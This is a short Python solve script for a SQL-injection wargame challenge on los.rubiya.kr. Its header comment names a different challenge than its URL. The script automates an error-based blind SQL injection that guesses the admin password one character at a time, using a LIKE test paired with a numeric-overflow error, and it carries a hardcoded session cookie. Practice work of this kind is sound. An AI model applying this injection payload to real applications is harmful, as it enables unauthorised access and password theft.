#LOS blue_dragon

import math
import time
import requests

url ="https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?" #공격URL
cookies ={"PHPSESSID": "8d3vv8d8cv9e49kv0u3kasqr6f"} #쿠키값
payload=""
check=0




while 1:

    for num in range(42,122):

        if (num == 95 or num ==96 or num ==46):
            continue

        tmp = payload + chr(num)+'%'  #9% -> 90% -> 902%

        value = "' or id = 'admin' and case when pw like \""+ tmp +"\" then 1 else 9e307*2 end #"
        params = {'pw': value}
        print(value)

        response = requests.get(url, params=params, cookies=cookies)

        #print(response.text)
        

        if ("config.php" in  response.text):
            payload = payload +chr(num) #9 -> 90 -> 902 (한글자씩 쌓기)
            print(">> " ,payload)
            check = 1


    if check == 1:    #찾으면 종료
        break